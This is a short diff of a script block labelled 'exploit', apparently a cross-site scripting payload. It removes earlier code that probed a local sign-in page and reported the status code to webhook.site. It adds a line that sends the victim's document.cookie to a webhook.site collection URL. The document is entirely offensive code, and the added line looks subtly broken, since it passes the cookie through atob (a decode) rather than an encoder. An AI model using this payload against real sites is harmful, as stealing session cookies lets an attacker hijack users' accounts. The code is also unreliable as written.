@@ -1,39 +1,8 @@
 <script>
 (async function exploit() {
-    try {
-        var response = await fetch("https://localhost/sign_in.php");
-        var statusCode = response.status;
-        console.log(`code = ${statusCode}`);
-        
-        if (response.ok) {
-            var text = await response.text();
-            console.log(`text = ${text}`);
-        } else {
-            console.log(`Error: ${response.statusText}`);
-        }
 
-        /*var headersString = "";
-        response.headers.forEach((value, name) => {
-            headersString += `${name}: ${value}\n`;
-        });
+        var lol = await fetch(`https://webhook.site/fd1dc2df-9cbd-40af-bf86-c38063a985e0/?cookie=${atob(document.cookie)}`);
 
-        var res = {
-            statusCode: statusCode,
-            headers: headersString,
-            body: text
-        };
-        var jsonData = JSON.stringify(res);*/
-
-        var lol = await fetch(`https://webhook.site/fd1dc2df-9cbd-40af-bf86-c38063a985e0/?id=${statusCode}`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ statusCode })
-        });
-    } catch (error) {
-        console.error('Fetch error: ', error);
-    }
 })();
 </script>
 
